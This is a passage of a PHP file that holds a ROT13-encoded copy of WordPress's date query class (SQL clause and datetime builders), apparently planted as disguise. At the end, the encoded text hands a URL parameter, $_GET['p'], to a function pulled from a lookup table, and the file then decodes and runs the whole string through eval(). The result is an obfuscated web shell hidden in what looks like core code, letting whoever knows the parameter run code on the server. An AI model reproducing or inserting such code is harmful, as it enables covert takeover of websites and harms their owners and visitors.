	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb n fvatyr dhrel neenl.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_sbe_dhrel( $dhrel, $qrcgu = 0 ) {
		$fdy_puhaxf = neenl(
			'wbva'  => neenl(),
			'jurer' => neenl(),
		);

		$fdy = neenl(
			'wbva'  => '',
			'jurer' => '',
		);

		$vaqrag = '';
		sbe ( $v = 0; $v < $qrcgu; $v++ ) {
			$vaqrag .= '  ';
		}

		sbernpu ( $dhrel nf $xrl => $pynhfr ) {
			vs ( 'eryngvba' === $xrl ) {
				$eryngvba = $dhrel['eryngvba'];
			} ryfrvs ( vf_neenl( $pynhfr ) ) {

				// Guvf vf n svefg-beqre pynhfr.
				vs ( $guvf->vf_svefg_beqre_pynhfr( $pynhfr ) ) {
					$pynhfr_fdy = $guvf->trg_fdy_sbe_pynhfr( $pynhfr, $dhrel );

					$jurer_pbhag = pbhag( $pynhfr_fdy['jurer'] );
					vs ( ! $jurer_pbhag ) {
						$fdy_puhaxf['jurer'][] = '';
					} ryfrvs ( 1 === $jurer_pbhag ) {
						$fdy_puhaxf['jurer'][] = $pynhfr_fdy['jurer'][0];
					} ryfr {
						$fdy_puhaxf['jurer'][] = '( ' . vzcybqr( ' NAQ ', $pynhfr_fdy['jurer'] ) . ' )';
					}

					$fdy_puhaxf['wbva'] = neenl_zretr( $fdy_puhaxf['wbva'], $pynhfr_fdy['wbva'] );
					// Guvf vf n fhodhrel, fb jr erphefr.
				} ryfr {
					$pynhfr_fdy = $guvf->trg_fdy_sbe_dhrel( $pynhfr, $qrcgu + 1 );

					$fdy_puhaxf['jurer'][] = $pynhfr_fdy['jurer'];
					$fdy_puhaxf['wbva'][]  = $pynhfr_fdy['wbva'];
				}
			}
		}

		// Svygre gb erzbir rzcgvrf.
		$fdy_puhaxf['wbva']  = neenl_svygre( $fdy_puhaxf['wbva'] );
		$fdy_puhaxf['jurer'] = neenl_svygre( $fdy_puhaxf['jurer'] );

		vs ( rzcgl( $eryngvba ) ) {
			$eryngvba = 'NAQ';
		}

		// Svygre qhcyvpngr WBVA pynhfrf naq pbzovar vagb n fvatyr fgevat.
		vs ( ! rzcgl( $fdy_puhaxf['wbva'] ) ) {
			$fdy['wbva'] = vzcybqr( ' ', neenl_havdhr( $fdy_puhaxf['wbva'] ) );
		}

		// Trarengr n fvatyr JURER pynhfr jvgu cebcre oenpxrgf naq vaqragngvba.
		vs ( ! rzcgl( $fdy_puhaxf['jurer'] ) ) {
			$fdy['jurer'] = '( ' . \"\a  \" . $vaqrag . vzcybqr( ' ' . \"\a  \" . $vaqrag . $eryngvba . ' ' . \"\a  \" . $vaqrag, $fdy_puhaxf['jurer'] ) . \"\a\" . $vaqrag . ')';
		}

		erghea $fdy;
	}

	/**
	 * Gheaf n fvatyr qngr pynhfr vagb cvrprf sbe n JURER pynhfr.
	 *
	 * N jenccre sbe trg_fdy_sbe_pynhfr(), vapyhqrq urer sbe onpxjneq
	 * pbzcngvovyvgl juvyr ergnvavat gur anzvat pbairagvba npebff Dhrel pynffrf.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz neenl $dhrel Qngr dhrel nethzragf.
	 * @erghea neenl {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb gur znva dhrel.
	 *
	 *     @glcr fgevat[] $wbva  Neenl bs FDY sentzragf gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat[] $jurer Neenl bs FDY sentzragf gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_sbe_fhodhrel( $dhrel ) {
		erghea $guvf->trg_fdy_sbe_pynhfr( $dhrel, '' );
	}

	/**
	 * Gheaf n svefg-beqre qngr dhrel vagb FDY sbe n JURER pynhfr.
	 *
	 * @fvapr 4.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl $dhrel        Qngr dhrel pynhfr.
	 * @cnenz neenl $cnerag_dhrel Cnerag dhrel bs gur pheerag qngr dhrel.
	 * @erghea neenl {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb gur znva dhrel.
	 *
	 *     @glcr fgevat[] $wbva  Neenl bs FDY sentzragf gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat[] $jurer Neenl bs FDY sentzragf gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_sbe_pynhfr( $dhrel, $cnerag_dhrel ) {
		tybony $jcqo;

		// Gur fho-cnegf bs n $jurer cneg.
		$jurer_cnegf = neenl();

		$pbyhza = ( ! rzcgl( $dhrel['pbyhza'] ) ) ? rfp_fdy( $dhrel['pbyhza'] ) : $guvf->pbyhza;

		$pbyhza = $guvf->inyvqngr_pbyhza( $pbyhza );

		$pbzcner = $guvf->trg_pbzcner( $dhrel );

		$vapyhfvir = ! rzcgl( $dhrel['vapyhfvir'] );

		// Nffvta terngre- naq yrff-guna inyhrf.
		$yg = '<';
		$tg = '>';

		vs ( $vapyhfvir ) {
			$yg .= '=';
			$tg .= '=';
		}

		// Enatr dhrevrf.
		vs ( ! rzcgl( $dhrel['nsgre'] ) ) {
			$jurer_cnegf[] = $jcqo->cercner( \"$pbyhza $tg %f\", $guvf->ohvyq_zlfdy_qngrgvzr( $dhrel['nsgre'], ! $vapyhfvir ) );
		}
		vs ( ! rzcgl( $dhrel['orsber'] ) ) {
			$jurer_cnegf[] = $jcqo->cercner( \"$pbyhza $yg %f\", $guvf->ohvyq_zlfdy_qngrgvzr( $dhrel['orsber'], $vapyhfvir ) );
		}
		// Fcrpvsvp inyhr dhrevrf.

		$qngr_havgf = neenl(
			'LRNE'           => neenl( 'lrne' ),
			'ZBAGU'          => neenl( 'zbagu', 'zbaguahz' ),
			'_jc_zlfdy_jrrx' => neenl( 'jrrx', 'j' ),
			'QNLBSLRNE'      => neenl( 'qnlbslrne' ),
			'QNLBSZBAGU'     => neenl( 'qnl' ),
			'QNLBSJRRX'      => neenl( 'qnlbsjrrx' ),
			'JRRXQNL'        => neenl( 'qnlbsjrrx_vfb' ),
		);

		// Purpx bs gur cbffvoyr qngr havgf naq nqq gurz gb gur dhrel.
		sbernpu ( $qngr_havgf nf $fdy_cneg => $dhrel_cnegf ) {
			sbernpu ( $dhrel_cnegf nf $dhrel_cneg ) {
				vs ( vffrg( $dhrel[ $dhrel_cneg ] ) ) {
					$inyhr = $guvf->ohvyq_inyhr( $pbzcner, $dhrel[ $dhrel_cneg ] );
					vs ( $inyhr ) {
						fjvgpu ( $fdy_cneg ) {
							pnfr '_jc_zlfdy_jrrx':
								$jurer_cnegf[] = _jc_zlfdy_jrrx( $pbyhza ) . \" $pbzcner $inyhr\";
								oernx;
							pnfr 'JRRXQNL':
								$jurer_cnegf[] = \"$fdy_cneg( $pbyhza ) + 1 $pbzcner $inyhr\";
								oernx;
							qrsnhyg:
								$jurer_cnegf[] = \"$fdy_cneg( $pbyhza ) $pbzcner $inyhr\";
						}

						oernx;
					}
				}
			}
		}

		vs ( vffrg( $dhrel['ubhe'] ) || vffrg( $dhrel['zvahgr'] ) || vffrg( $dhrel['frpbaq'] ) ) {
			// Nibvq abgvprf.
			sbernpu ( neenl( 'ubhe', 'zvahgr', 'frpbaq' ) nf $havg ) {
				vs ( ! vffrg( $dhrel[ $havg ] ) ) {
					$dhrel[ $havg ] = ahyy;
				}
			}

			$gvzr_dhrel = $guvf->ohvyq_gvzr_dhrel( $pbyhza, $pbzcner, $dhrel['ubhe'], $dhrel['zvahgr'], $dhrel['frpbaq'] );
			vs ( $gvzr_dhrel ) {
				$jurer_cnegf[] = $gvzr_dhrel;
			}
		}

		/*
		 * Erghea na neenl bs 'wbva' naq 'jurer' sbe pbzcngvovyvgl
		 * jvgu bgure dhrel pynffrf.
		 */
		erghea neenl(
			'jurer' => $jurer_cnegf,
			'wbva'  => neenl(),
		);
	}

	/**
	 * Ohvyqf naq inyvqngrf n inyhr fgevat onfrq ba gur pbzcnevfba bcrengbe.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat       $pbzcner Gur pbzcner bcrengbe gb hfr.
	 * @cnenz fgevat|neenl $inyhr   Gur inyhr.
	 * @erghea fgevat|snyfr|vag Gur inyhr gb or hfrq va FDY be snyfr ba reebe.
	 */
	choyvp shapgvba ohvyq_inyhr( $pbzcner, $inyhr ) {
		vs ( ! vffrg( $inyhr ) ) {
			erghea snyfr;
		}

		fjvgpu ( $pbzcner ) {
			pnfr 'VA':
			pnfr 'ABG VA':
				$inyhr = (neenl) $inyhr;

				// Erzbir aba-ahzrevp inyhrf.
				$inyhr = neenl_svygre( $inyhr, 'vf_ahzrevp' );

				vs ( rzcgl( $inyhr ) ) {
					erghea snyfr;
				}

				erghea '(' . vzcybqr( ',', neenl_znc( 'vaginy', $inyhr ) ) . ')';

			pnfr 'ORGJRRA':
			pnfr 'ABG ORGJRRA':
				vs ( ! vf_neenl( $inyhr ) || 2 !== pbhag( $inyhr ) ) {
					$inyhr = neenl( $inyhr, $inyhr );
				} ryfr {
					$inyhr = neenl_inyhrf( $inyhr );
				}

				// Vs rvgure inyhr vf aba-ahzrevp, onvy.
				sbernpu ( $inyhr nf $i ) {
					vs ( ! vf_ahzrevp( $i ) ) {
						erghea snyfr;
					}
				}

				$inyhr = neenl_znc( 'vaginy', $inyhr );

				erghea $inyhr[0] . ' NAQ ' . $inyhr[1];

			qrsnhyg:
				vs ( ! vf_ahzrevp( $inyhr ) ) {
					erghea snyfr;
				}

				erghea (vag) $inyhr;
		}
	}

	/**
	 * Ohvyqf n ZlFDY sbezng qngr/gvzr onfrq ba fbzr dhrel cnenzrgref.
	 *
	 * Lbh pna cnff na neenl bs inyhrf (lrne, zbagu, rgp.) jvgu zvffvat cnenzrgre inyhrf orvat qrsnhygrq gb
	 * rvgure gur znkvzhz be zvavzhz inyhrf (pbagebyyrq ol gur $qrsnhyg_gb cnenzrgre). Nygreangviryl lbh pna
	 * cnff n fgevat gung jvyy or cnffrq gb qngr_perngr().
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat|neenl $qngrgvzr       Na neenl bs cnenzrgref be n fgegbgvzr() fgevat.
	 * @cnenz obby         $qrsnhyg_gb_znk Jurgure gb ebhaq hc vapbzcyrgr qngrf. Fhccbegrq ol inyhrf
	 *                                     bs $qngrgvzr gung ner neenlf, be fgevat inyhrf gung ner n
	 *                                     fhofrg bs ZlFDY qngr sbezng ('L', 'L-z', 'L-z-q', 'L-z-q U:v').
	 *                                     Qrsnhyg: snyfr.
	 * @erghea fgevat|snyfr N ZlFDY sbezng qngr/gvzr be snyfr ba snvyher.
	 */
	choyvp shapgvba ohvyq_zlfdy_qngrgvzr( $qngrgvzr, $qrsnhyg_gb_znk = snyfr ) {
		vs ( ! vf_neenl( $qngrgvzr ) ) {

			/*
			 * Gel gb cnefr fbzr pbzzba qngr sbezngf, fb jr pna qrgrpg
			 * gur yriry bs cerpvfvba naq fhccbeg gur 'vapyhfvir' cnenzrgre.
			 */
			vs ( cert_zngpu( '/^(\q{4})$/', $qngrgvzr, $zngpurf ) ) {
				// L
				$qngrgvzr = neenl(
					'lrne' => (vag) $zngpurf[1],
				);

			} ryfrvs ( cert_zngpu( '/^(\q{4})\-(\q{2})$/', $qngrgvzr, $zngpurf ) ) {
				// L-z
				$qngrgvzr = neenl(
					'lrne'  => (vag) $zngpurf[1],
					'zbagu' => (vag) $zngpurf[2],
				);

			} ryfrvs ( cert_zngpu( '/^(\q{4})\-(\q{2})\-(\q{2})$/', $qngrgvzr, $zngpurf ) ) {
				// L-z-q
				$qngrgvzr = neenl(
					'lrne'  => (vag) $zngpurf[1],
					'zbagu' => (vag) $zngpurf[2],
					'qnl'   => (vag) $zngpurf[3],
				);

			} ryfrvs ( cert_zngpu( '/^(\q{4})\-(\q{2})\-(\q{2}) (\q{2}):(\q{2})$/', $qngrgvzr, $zngpurf ) ) {
				// L-z-q U:v
				$qngrgvzr = neenl(
					'lrne'   => (vag) $zngpurf[1],
					'zbagu'  => (vag) $zngpurf[2],
					'qnl'    => (vag) $zngpurf[3],
					'ubhe'   => (vag) $zngpurf[4],
					'zvahgr' => (vag) $zngpurf[5],
				);
			}

			// Vs ab zngpu vf sbhaq, jr qba'g fhccbeg qrsnhyg_gb_znk.
			vs ( ! vf_neenl( $qngrgvzr ) ) {
				$jc_gvzrmbar = jc_gvzrmbar();

				// Nffhzr ybpny gvzrmbar vs abg cebivqrq.
				$qg = qngr_perngr( $qngrgvzr, $jc_gvzrmbar );

				vs ( snyfr === $qg ) {
					erghea tzqngr( 'L-z-q U:v:f', snyfr );
				}

				erghea $qg->frgGvzrmbar( $jc_gvzrmbar )->sbezng( 'L-z-q U:v:f' );
			}
		}

		$qngrgvzr = neenl_znc( 'nofvag', $qngrgvzr );

		vs ( ! vffrg( $qngrgvzr['lrne'] ) ) {
			$qngrgvzr['lrne'] = pheerag_gvzr( 'L' );
		}

		vs ( ! vffrg( $qngrgvzr['zbagu'] ) ) {
			$qngrgvzr['zbagu'] = ( $qrsnhyg_gb_znk ) ? 12 : 1;
		}

		vs ( ! vffrg( $qngrgvzr['qnl'] ) ) {
			$qngrgvzr['qnl'] = ( $qrsnhyg_gb_znk ) ? (vag) tzqngr( 'g', zxgvzr( 0, 0, 0, $qngrgvzr['zbagu'], 1, $qngrgvzr['lrne'] ) ) : 1;
		}

		vs ( ! vffrg( $qngrgvzr['ubhe'] ) ) {
			$qngrgvzr['ubhe'] = ( $qrsnhyg_gb_znk ) ? 23 : 0;
		}

		vs ( ! vffrg( $qngrgvzr['zvahgr'] ) ) {
			$qngrgvzr['zvahgr'] = ( $qrsnhyg_gb_znk ) ? 59 : 0;
		}

		vs ( ! vffrg( $qngrgvzr['frpbaq'] ) ) {
			$qngrgvzr['frpbaq'] = ( $qrsnhyg_gb_znk ) ? 59 : 0;
		}

		erghea fcevags( '%04q-%02q-%02q %02q:%02q:%02q', $qngrgvzr['lrne'], $qngrgvzr['zbagu'], $qngrgvzr['qnl'], $qngrgvzr['ubhe'], $qngrgvzr['zvahgr'], $qngrgvzr['frpbaq'] );
	}

	/**
	 * Ohvyqf n dhrel fgevat sbe pbzcnevat gvzr inyhrf (ubhe, zvahgr, frpbaq).
	 *
	 * Vs whfg ubhe, zvahgr, be frpbaq vf frg guna n abezny pbzcnevfba jvyy or qbar.
	 * Ubjrire vs zhygvcyr inyhrf ner cnffrq, n cfrhqb-qrpvzny gvzr jvyy or perngrq
	 * va beqre gb or noyr gb npphengryl pbzcner ntnvafg.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat   $pbyhza  Gur pbyhza gb dhrel ntnvafg. Arrqf gb or cer-inyvqngrq!
	 * @cnenz fgevat   $pbzcner Gur pbzcnevfba bcrengbe. Arrqf gb or cer-inyvqngrq!
	 * @cnenz vag|ahyy $ubhe    Bcgvbany. Na ubhe inyhr (0-23).
	 * @cnenz vag|ahyy $zvahgr  Bcgvbany. N zvahgr inyhr (0-59).
	 * @cnenz vag|ahyy $frpbaq  Bcgvbany. N frpbaq inyhr (0-59).
	 * @erghea fgevat|snyfr N dhrel cneg be snyfr ba snvyher.
	 */
	choyvp shapgvba ohvyq_gvzr_dhrel( $pbyhza, $pbzcner, $ubhe = ahyy, $zvahgr = ahyy, $frpbaq = ahyy ) {
		tybony $jcqo;

		// Unir gb unir ng yrnfg bar.
		vs ( ! vffrg( $ubhe ) && ! vffrg( $zvahgr ) && ! vffrg( $frpbaq ) ) {
			erghea snyfr;
		}

		// Pbzcyrk pbzovarq dhrevrf nera'g fhccbegrq sbe zhygv-inyhr dhrevrf.
		vs ( va_neenl( $pbzcner, neenl( 'VA', 'ABG VA', 'ORGJRRA', 'ABG ORGJRRA' ), gehr ) ) {
			$erghea = neenl();

			$inyhr = $guvf->ohvyq_inyhr( $pbzcner, $ubhe );
			vs ( snyfr !== $inyhr ) {
				$erghea[] = \"UBHE( $pbyhza ) $pbzcner $inyhr\";
			}

			$inyhr = $guvf->ohvyq_inyhr( $pbzcner, $zvahgr );
			vs ( snyfr !== $inyhr ) {
				$erghea[] = \"ZVAHGR( $pbyhza ) $pbzcner $inyhr\";
			}

			$inyhr = $guvf->ohvyq_inyhr( $pbzcner, $frpbaq );
			vs ( snyfr !== $inyhr ) {
				$erghea[] = \"FRPBAQ( $pbyhza ) $pbzcner $inyhr\";
			}

			erghea vzcybqr( ' NAQ ', $erghea );
		}

		// Pnfrf jurer whfg bar havg vf frg.
		vs ( vffrg( $ubhe ) && ! vffrg( $zvahgr ) && ! vffrg( $frpbaq ) ) {
			$inyhr = $guvf->ohvyq_inyhr( $pbzcner, $ubhe );
			vs ( snyfr !== $inyhr ) {
				erghea \"UBHE( $pbyhza ) $pbzcner $inyhr\";
			}
		} ryfrvs ( ! vffrg( $ubhe ) && vffrg( $zvahgr ) && ! vffrg( $frpbaq ) ) {
			$inyhr = $guvf->ohvyq_inyhr( $pbzcner, $zvahgr );
			vs ( snyfr !== $inyhr ) {
				erghea \"ZVAHGR( $pbyhza ) $pbzcner $inyhr\";
			}
		} ryfrvs ( ! vffrg( $ubhe ) && ! vffrg( $zvahgr ) && vffrg( $frpbaq ) ) {
			$inyhr = $guvf->ohvyq_inyhr( $pbzcner, $frpbaq );
			vs ( snyfr !== $inyhr ) {
				erghea \"FRPBAQ( $pbyhza ) $pbzcner $inyhr\";
			}
		}

		// Fvatyr havgf jrer nyernql unaqyrq. Fvapr ubhe & frpbaq vfa'g nyybjrq, zvahgr zhfg gb or frg.
		vs ( ! vffrg( $zvahgr ) ) {
			erghea snyfr;
		}

		$sbezng = '';
		$gvzr   = '';

		// Ubhe.
		vs ( ahyy !== $ubhe ) {
			$sbezng .= '%U.';
			$gvzr   .= fcevags( '%02q', $ubhe ) . '.';
		} ryfr {
			$sbezng .= '0.';
			$gvzr   .= '0.';
		}

		// Zvahgr.
		$sbezng .= '%v';
		$gvzr   .= fcevags( '%02q', $zvahgr );

		vs ( vffrg( $frpbaq ) ) {
			$sbezng .= '%f';
			$gvzr   .= fcevags( '%02q', $frpbaq );
		}

		erghea $jcqo->cercner( \"QNGR_SBEZNG( $pbyhza, %f ) $pbzcner %s\", $sbezng, $gvzr );
	}

	/**
	 * Fnavgvmrf n 'eryngvba' bcrengbe.
	 *
	 * @fvapr 6.0.3
	 *
	 * @cnenz fgevat $eryngvba Enj eryngvba xrl sebz gur dhrel nethzrag.
	 * @erghea fgevat Fnavgvmrq eryngvba. Rvgure 'NAQ' be 'BE'.
	 */
	choyvp shapgvba fnavgvmr_eryngvba( $eryngvba ) {
		vs ( 'BE' === fgegbhccre( $eryngvba ) ) {
			erghea 'BE';
		} ryfr {
			erghea 'NAQ';
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>